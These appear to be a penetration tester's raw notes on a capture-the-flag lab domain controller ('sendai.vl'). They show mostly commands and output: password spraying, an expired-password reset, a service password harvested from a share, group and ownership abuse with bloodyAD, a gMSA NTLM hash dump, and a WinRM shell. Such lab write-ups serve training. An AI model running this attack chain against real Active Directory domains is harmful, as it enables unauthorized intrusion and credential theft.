
```python
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-28 19:29:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
443 web
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-28T19:29:10+00:00
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2025-04-15T02:26:14
|_Not valid after:  2025-10-15T02:26:14
|_ssl-date: 2025-08-28T19:29:49+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-28T19:29:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```



```
kali@kali ~/b/v/sendai> nxc smb sendai.vl -u support -p support --no-bruteforce --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\support:support (Guest)
SMB         10.129.234.66   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
kali@kali ~/b/v/sendai> nxc smb sendai.vl -u '' -p '' --no-bruteforce --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\: 
SMB         10.129.234.66   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```




```python
kali@kali ~/b/v/sendai> nxc smb sendai.vl -u realusers.txt -p realusers.txt --no-bruteforce
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$:DC$ STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc:sqlsvc STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc:websvc STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones:Dorothy.Jones STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson:Kerry.Robinson STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner:Naomi.Gardner STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith:Anthony.Smith STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper:Susan.Harper STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson:Stephen.Simpson STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher:Marie.Gallagher STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly:Kathleen.Kelly STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter:Norman.Baxter STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady:Jason.Brady STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates:Elliot.Yates STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith:Malcolm.Smith STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams:Lisa.Williams STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan:Ross.Sullivan STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey:Clifford.Davey STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins:Declan.Jenkins STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant:Lawrence.Grant STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson:Leslie.Johnson STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards:Megan.Edwards STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell:Thomas.Powell STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$:mgtsvc$ STATUS_LOGON_FAILURE 
```


- further re-inforce empty password

```
kali@kali ~/b/v/sendai [2]> nxc smb sendai.vl -u realusers.txt -p "" --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 

```


```python
kali@kali ~/b/v/sendai> nxc smb sendai.vl -u Elliot.Yates -p "" -M change-password -o NEWPASS=Fuckyou123!
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for Elliot.Yates
```


```python
kali@kali ~/.n/m/n/10.129.234.66> nxc smb sendai.vl -u Elliot.Yates -p "Fuckyou123!" --shares 
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Elliot.Yates:Fuckyou123! 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config          READ,WRITE      
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.66   445    DC               Users           READ            
```


```
kali@kali ~/.n/m/n/1/config> cat .sqlconfig 
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;⏎                                                                                                                                                              
kali@kali ~/.n/m/n/1/config> bloodyAD --host 10.129.234.66 -d sendai.vl -u sqlsvc -p SurenessBlob85 get writable 

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=sendai,DC=vl
permission: WRITE

distinguishedName: CN=sqlsvc,OU=services,DC=sendai,DC=vl
permission: WRITE
```



```python
kali@kali ~/b/v/sendai> ffuf -H "Host: FUZZ.sendai.vl" -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" -u https://sendai.vl/ -fs 703

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://sendai.vl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.sendai.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

service                 [Status: 200, Size: 4189, Words: 1104, Lines: 91, Duration: 120ms]
```



![[sendai-20250828231107238.webp]]



```python
kali@kali ~> bloodyAD --host 10.129.234.66 -d sendai.vl -u Thomas.Powell -p Fuckyou123! get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=sendai,DC=vl
permission: WRITE

distinguishedName: CN=Thomas Powell,OU=staff,DC=sendai,DC=vl
permission: WRITE

distinguishedName: CN=admsvc,OU=admsvc,DC=sendai,DC=vl
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: OU=admsvc,DC=sendai,DC=vl
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```



```python
╭─LDAPS─[dc.sendai.vl]─[SENDAI\Thomas.Powell]-[NS:10.129.234.66]
╰─PV ❯ Get-DomainGroup admsvc
cn                    : admsvc
member                : CN=Norman Baxter,OU=staff,DC=sendai,DC=vl
                        CN=websvc,OU=services,DC=sendai,DC=vl
distinguishedName     : CN=admsvc,OU=admsvc,DC=sendai,DC=vl
instanceType          : 4
name                  : admsvc
objectGUID            : {32d7c6dd-611b-4795-b9c0-7ceada6aa926}
objectSid             : S-1-5-21-3085872742-570972823-736764132-1129
sAMAccountName        : admsvc
sAMAccountType        : SAM_GROUP_OBJECT
groupType             : -2147483646
objectCategory        : CN=Group,CN=Schema,CN=Configuration,DC=sendai,DC=vl


```



```
kali@kali ~> bloodyAD --host 10.129.234.66 -d sendai.vl -u Thomas.Powell -p Fuckyou123! add groupMember admsvc Thomas.Powell
[+] Thomas.Powell added to admsvc
```


```
kali@kali ~/.n/m/n/1/config> bloodyAD --host 10.129.234.66 -d sendai.vl -u Thomas.Powell -p Fuckyou123! set owner admsvc thomas.powell
[+] Old owner S-1-5-21-3085872742-570972823-736764132-512 is now replaced by thomas.powell on admsvc
```


![[sendai-20250829000529476.webp]]


```
kali@kali ~/b/v/sendai> nxc ldap sendai.vl -u Thomas.Powell -p "Fuckyou123!" --gmsa
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Thomas.Powell:Fuckyou123! 
LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: edac7f05cded0b410232b7466ec47d6f     PrincipalsAllowedToReadPassword: admsvc
kali@kali ~/b/v/sendai> 
```






turns out this fucker can PSremote in as can seen from the bloodhound graph

```
kali@kali ~/b/v/sendai [2]> export KRB5CCNAME=mgtsvc\$@DC.sendai.vl.ccache
kali@kali ~/b/v/sendai> evil-winrm  -i dc.sendai.vl -r sendai.vl 
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> ls

```



![[sendai-20250829000845507.webp]]



